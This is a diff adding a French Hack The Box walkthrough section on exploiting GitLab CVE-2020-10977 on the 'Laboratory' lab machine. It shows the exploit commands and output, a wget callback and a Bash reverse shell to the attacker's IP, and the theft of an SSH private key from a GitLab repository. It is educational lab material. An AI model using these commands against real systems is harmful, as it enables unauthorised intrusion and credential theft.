@@ -466,6 +466,314 @@ https://github.com/vandycknick/gitlab-cve-2020-10977
 
 À ce stade, l’objectif est donc de vérifier si cette vulnérabilité peut s’appliquer notre version `12.8.1` observée sur la cible, puis de comprendre son fonctionnement avant de l’utiliser.
 
+### Exploitation de gitlab-cve-2020-10977
+
+La recherche précédente permet d’identifier un dépôt GitHub proposant un exploit pour `gitlab-cve-2020-10977`. L’exploit nécessite un compte GitLab valide, ce qui correspond à la situation actuelle puisque tu as pu créer un compte sur l’interface web.
+
+#### Clonage sur Kali
+
+Sur Kali, tu clones le dépôt contenant le script d’exploitation :
+
+```bash
+git clone https://github.com/vandycknick/gitlab-cve-2020-10977.git
+cd gitlab-cve-2020-10977.git
+```
+
+
+
+#### Test de l’exploit
+
+Avant de lancer l’exploit directement, tu affiches son aide afin de vérifier les options disponibles :
+
+```bash
+python3 cve_2020_10977.py -h
+```
+
+Ce qui te donne :
+
+```bash
+usage: cve_2020_10977.py [-h] --url URL -u USERNAME
+                                     -p PASSWORD [--cmd CMD]
+                                     [--insecure]
+
+options:
+  -h, --help            show this help message and exit
+  --url URL             Target URL
+  -u, --username USERNAME
+                        Gitlab username
+  -p, --password PASSWORD
+                        Gitlab password
+  --cmd CMD             Command to execute
+  --insecure            Allow insecure server connections when using
+                        SSL
+
+```
+
+Le script attend notamment l’URL de la cible, un nom d’utilisateur GitLab, un mot de passe, ainsi qu’une commande optionnelle à exécuter.
+
+Les options `-u` et `-p` correspondent aux identifiants du compte GitLab créé précédemment depuis la page d’enregistrement de l’application web. Ici, tu réutilises donc le compte `noelnac` et le mot de passe `Password123!`associé.
+
+L’option `--cmd` est particulièrement intéressante, car elle permet d’indiquer la commande à exécuter sur la cible. C’est ce mécanisme qui pourra ensuite servir à lancer un reverse shell vers Kali.
+
+**L’option `--insecure` est importante ici, car elle permet de lancer l’exploit malgré le certificat self-signed présenté par l’instance GitLab.**
+
+#### Premier test sans commande
+
+Avant de tenter un reverse shell, tu peux lancer l’exploit sans option `--cmd`. Cela permet de vérifier que le script fonctionne correctement avec l’URL cible, le compte GitLab créé précédemment et le certificat self-signed.
+
+```bash
+python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p Password123! --insecure
+```
+
+Le script se connecte à GitLab, crée deux projets temporaires, crée une issue, puis la déplace d’un projet vers l’autre. Ce mécanisme est utilisé pour exploiter la vulnérabilité et lire un fichier sensible de l’installation GitLab.
+
+```bash
+[INFO] Logging into Gitlab ...
+[INFO] Login Successfull!
+[INFO] Creating project 607da931-aeda-4f6a-8a30-1af48a5eb853
+[INFO] Creating project f11713fc-c19c-40d4-b468-72f55252f581
+[INFO] Creating issue 166c3322-bba0-497b-b193-217c134fc705 in project 607da931-aeda-4f6a-8a30-1af48a5eb853
+[INFO] Moving issue 166c3322-bba0-497b-b193-217c134fc705 from project 607da931-aeda-4f6a-8a30-1af48a5eb853 to f11713fc-c19c-40d4-b468-72f55252f581
+[INFO] Extracting secret from file
+[INFO] GitLab Secret: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
+```
+
+Le message `Login Successfull!` confirme que les identifiants GitLab sont valides. La ligne `GitLab Secret` montre ensuite que l’exploit parvient à lire le secret GitLab nécessaire à la suite de l’exploitation.
+
+À ce stade, tu sais donc que l’exploit est fonctionnel. Tu peux maintenant passer à l’exécution d’une commande avec l’option `--cmd`.
+
+#### Validation de l’exécution de commande
+
+Avant de lancer un reverse shell, tu peux faire un test plus simple avec `wget`. L’idée est de demander à la cible de récupérer un fichier hébergé sur ta machine Kali. Si Kali reçoit la requête HTTP, cela confirme que la commande fournie à l’option `--cmd` est bien exécutée sur la cible.
+
+Sur Kali, tu crées d’abord un petit fichier de test :
+
+```bash
+echo "poc command execution" > test.txt
+```
+
+Puis tu lances un serveur HTTP dans le même répertoire :
+
+```bash
+python3 -m http.server 8000
+```
+
+Ensuite, tu relances l’exploit en ajoutant une commande `wget` :
+
+```bash
+python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p Password123! --insecure --cmd "wget http://10.10.16.20:8000/test.txt" 
+```
+
+Si l’exécution de commande fonctionne, le serveur HTTP lancé sur Kali reçoit une requête depuis la cible :
+
+```bash
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.8.117 - - [01/Jun/2026 16:57:39] "GET /test.txt HTTP/1.1" 200 -
+```
+
+Ce test confirme que l’exploit permet bien d’exécuter une commande sur la machine cible. Tu peux maintenant remplacer la commande `wget` par une commande destinée à établir un reverse shell vers Kali.
+
+#### Obtention du reverse shell
+
+Après avoir validé l’exécution de commande avec `wget`, tu peux remplacer la commande de test par un reverse shell Bash.
+
+Sur Kali, tu commences par ouvrir un listener Netcat :
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+Tu relances ensuite l’exploit en utilisant l’option `--cmd` pour exécuter un reverse shell vers ton IP VPN HTB :
+
+```bash
+python3 cve_2020_10977.py --url https://git.laboratory.htb -u noelnac -p Password123! --insecure --cmd "bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'
+```
+
+Dans cette commande, l’exploit se connecte à GitLab avec le compte créé précédemment, puis utilise l’exécution de commande pour lancer un shell Bash vers Kali.
+
+Si tout se passe correctement, le listener reçoit une connexion entrante :
+
+```bash
+listening on [any] 4444 ...
+connect to [10.10.16.20] from (UNKNOWN) [10.129.8.117] 35368
+bash: cannot set terminal process group (413): Inappropriate ioctl for device
+bash: no job control in this shell
+git@git:~/gitlab-rails/working$ 
+```
+
+Tu obtiens alors un shell en tant qu’utilisateur `git`, dans le contexte de l’installation GitLab.
+
+#### Stabilisation du shell
+
+Le reverse shell obtenu fonctionne, mais il reste peu confortable pour poursuivre l’exploitation. Tu peux donc le stabiliser avec la méthode classique déjà présentée dans la recette dédiée : {{< recette "stabiliser-reverse-shell" >}}
+
+Tu commences par obtenir un pseudo-terminal avec Python :
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Tu suspends ensuite le shell avec `Ctrl+Z`, puis tu configures ton terminal local sur Kali :
+
+```bash
+stty raw -echo; fg
+```
+
+Après le retour dans le shell distant, tu appuies une fois sur `Entrée`, puis tu définis quelques variables utiles :
+
+```bash
+export TERM=xterm export
+stty rows 40 columns 120
+```
+
+Tu disposes maintenant d’un shell plus confortable pour explorer l’installation GitLab depuis le compte `git`.
+
+### Exploitation du shell git
+
+Le reverse shell obtenu te donne un accès en tant qu’utilisateur `git`, c’est-à-dire l’utilisateur système utilisé par GitLab.
+
+Tu peux commencer par vérifier le contexte courant :
+
+```bash
+cd ~
+whoami
+id
+hostname
+pwd
+```
+
+Le shell confirme que tu te trouves dans le contexte applicatif de GitLab :
+
+```bash
+cd ~
+git@git:~$ whoami
+id
+hostname
+whoami
+pwd
+git
+git@git:~$ id
+uid=998(git) gid=998(git) groups=998(git)
+git@git:~$ hostname
+git.laboratory.htb
+git@git:~$ 
+pwd
+/var/opt/gitlab
+```
+
+À ce stade, l’objectif est de comprendre ce que cet utilisateur peut lire dans l’installation GitLab. 
+
+#### Recherche des repositories
+
+Comme GitLab héberge des dépôts Git, tu peux rechercher l’emplacement des répertoires appelés `repositories` :
+
+```bash
+find / -type d -name repositories 2>/dev/null
+```
+
+Sur cette machine, la commande permet d’identifier l’emplacement des dépôts GitLab :
+
+```text
+/var/opt/gitlab/git-data/repositories
+```
+
+Tu recherches ensuite les dépôts Git présents dans cette arborescence :
+
+```bash
+find /var/opt/gitlab/git-data/repositories -type d -name "*.git" 2>/dev/null
+```
+
+La recherche retourne plusieurs dépôts :
+
+```bash
+/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.wiki.git
+/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git
+/var/opt/gitlab/git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.wiki.git
+/var/opt/gitlab/git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git
+```
+
+#### Lecture des repositories
+
+Ces chemins correspondent à des dépôts Git stockés au format interne. Les fichiers du projet ne sont donc pas visibles directement avec un simple `ls`.
+
+Pour les afficher, tu dois interroger le dépôt avec Git, en utilisant l’option `--git-dir`.
+
+Par exemple, sur le premier dépôt non-wiki :
+
+```bash
+git --git-dir=/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git \
+  ls-tree -r HEAD --name-only
+```
+
+La liste des fichiers montre immédiatement des éléments intéressants :
+
+```txt
+README.md
+create_gitlab.sh
+dexter/.ssh/authorized_keys
+dexter/.ssh/id_rsa
+dexter/recipe.url
+dexter/todo.txt
+```
+
+#### dexter_id_rsa
+
+Le fichier le plus sensible est `dexter/.ssh/id_rsa`, car il correspond à une clé privée SSH. Sa présence suggère une possibilité de connexion au compte système `dexter`.
+
+Tu peux extraire cette clé directement depuis le dépôt avec `git show` :
+
+```bash
+git --git-dir=/var/opt/gitlab/git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git show HEAD:dexter/.ssh/id_rsa
+```
+
+Sur Kali, tu copies le contenu complet de la clé dans un fichier local :
+
+```bash
+nano dexter_id_rsa
+```
+
+La clé doit être copiée entièrement, depuis la ligne `-----BEGIN RSA PRIVATE KEY-----` jusqu’à la ligne `-----END RSA PRIVATE KEY-----`.
+
+Tu ajustes ensuite ses permissions, car SSH refuse généralement d’utiliser une clé privée trop accessible :
+
+```bash
+chmod 600 dexter_id_rsa
+```
+
+#### Connexion SSH
+
+Tu peux maintenant tenter une connexion SSH avec l’utilisateur `dexter` :
+
+```bash
+ssh -i dexter_id_rsa dexter@laboratory.htb
+```
+
+La connexion permet de sortir du contexte applicatif GitLab et d’obtenir un accès SSH avec un utilisateur système classique.
+
+```bash
+dexter@laboratory:~$
+```
+
+### user.txt
+
+Depuis la session SSH de `dexter`, tu peux lire le premier flag :
+
+```bash
+dexter@laboratory:~$ ls -l
+total 4
+-r--r----- 1 root dexter 33 Jun  1 08:28 user.txt
+
+dexter@laboratory:~$ cat user.txt
+3257xxxxxxxxxxxxxxxxxxxxxxxx0750
+```
+
+À ce stade, la prise de pied est terminée : tu disposes maintenant d’un shell SSH stable avec l’utilisateur système `dexter`.
+
+
+
+
+
 ## Escalade de privilèges
 
 {{< escalade-intro user="ssh_user" >}}
